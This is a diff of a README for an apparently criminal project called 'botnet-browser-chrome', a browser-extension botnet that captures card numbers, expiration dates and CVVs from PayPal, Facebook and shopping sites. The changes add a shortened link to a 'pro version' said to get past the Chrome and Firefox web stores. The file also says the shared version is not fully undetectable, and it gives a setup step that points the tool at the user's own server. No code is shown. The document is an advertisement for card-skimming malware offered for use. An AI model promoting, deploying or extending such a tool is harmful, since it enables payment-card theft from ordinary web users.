@@ -1,5 +1,5 @@
 # botnet-browser-chrome
-botnet browser chrome,mozilla firefox,capture card number any web site ,paypal,facebook,e-commerce ,get card number,expiration date, CVV 
+botnet browser chrome,mozilla firefox,capture card number any web site ,paypal,facebook,e-commerce ,get card number,expiration date, CVV ,pro version https://bit.ly/3bsV6Fa
 
 # Help 
 ![1](https://user-images.githubusercontent.com/30985149/76715397-24141180-6724-11ea-8623-21d963a81c92.png)
@@ -34,6 +34,8 @@ change http://1127.0.0.1     to your web server
 waring !!!!!!!
 # Version pro to bypass mozilla firefox or chrome web store
 # Contact me because this version was shared by many people and it is not fud
+
+https://bit.ly/3bsV6Fa
 
 ##################################################
 
